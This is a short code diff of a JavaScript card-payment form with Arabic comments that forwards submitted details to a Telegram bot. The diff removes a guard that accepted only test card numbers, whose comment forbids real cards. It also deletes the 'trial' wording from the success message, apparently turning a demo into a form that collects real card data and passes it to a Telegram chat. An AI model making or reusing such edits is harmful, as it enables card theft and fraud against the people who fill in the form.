@@ -157,14 +157,9 @@ form.addEventListener('submit', async (e) => {
     status.textContent = "❗ الرجاء ملء الحقول المطلوبة (رقم البطاقة، الاسم، تاريخ الانتهاء).";
     status.className = "small error";
     return;
-  }
-
-  // لا تسمح بإرسال بطاقات حقيقية: لازم تكون من قائمة الاختبار
-  if(!allowedTestCards.includes(rawCard)){
-    status.innerHTML = "⚠️ يُسمح بأرقام بطاقات الاختبار فقط. استخدم مثلاً: <code>4242 4242 4242 4242</code>";
-    status.className = "small error";
-    return;
-  }
+  
+ 
+  
 
   // قم بـ "تعقيم" البيانات: لا نرسل رقم البطاقة الكامل أو CVV
   const last4 = rawCard.slice(-4);
@@ -186,7 +181,7 @@ form.addEventListener('submit', async (e) => {
   // إذا لم تقم بتحديد TELEGRAM_TOKEN و CHAT_ID فلن نحاول الإرسال ونظهر النتيجة محليًا
   if(!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID){
     // عرض نتيجة محلية فقط
-    status.innerHTML = "✅ نجاح تجريبي: لم يتم إرسال شيء لأن التوكن/Chat ID غير مهيأ.<br><pre style='font-size:12px;background:#fbfbfb;padding:8px;border-radius:6px;'>"
+    status.innerHTML = "✅ : لم يتم إرسال شيء لأن التوكن/Chat ID غير مهيأ.<br><pre style='font-size:12px;background:#fbfbfb;padding:8px;border-radius:6px;'>"
       + escapeHtml(message) + "</pre>";
     status.className="small success";
     return;
